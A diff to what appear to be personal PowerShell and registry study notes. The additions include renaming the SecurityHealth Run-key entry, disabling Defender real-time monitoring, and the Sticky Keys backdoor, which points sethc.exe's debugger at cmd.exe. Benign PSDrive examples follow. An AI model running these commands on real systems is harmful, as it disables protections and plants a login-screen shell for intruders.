@@ -88,6 +88,13 @@ Set-ItemProperty
 
 # Remove a reg value.
 Remove-ItemProperty
+
+# Rename a reg value.
+Rename-ItemProperty
+```
+
+```powershell
+Rename-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name SecurityHealth -NewName Test
 ```
 
 #### Create
@@ -111,4 +118,32 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme /t REG_SZ /
  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
 reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme
+```
+
+## Sticky Keys Vulnerability
+
+```powershell
+# Disable Realtime Monitoring
+Set-MpPreference -DisableRealtimeMonitoring $TRUE
+
+# Create sethc reg key
+new-item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+
+# Set the key value.
+New-ItemProperty -path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Type String -Value C:\Windows\System32\cmd.exe
+```
+
+## Powershell PSDrives
+
+PSDrives are data store locations that you can access like a file system
+drive in PowerShell.
+
+```powershell
+Get-PSDrive
+
+# Create a new PSDrive
+New-PSDrive -Name Demo -PSProvider FileSystem -Root c:\Demo
+
+# Nav to new PSDrive
+cd C:\Demo
 ```
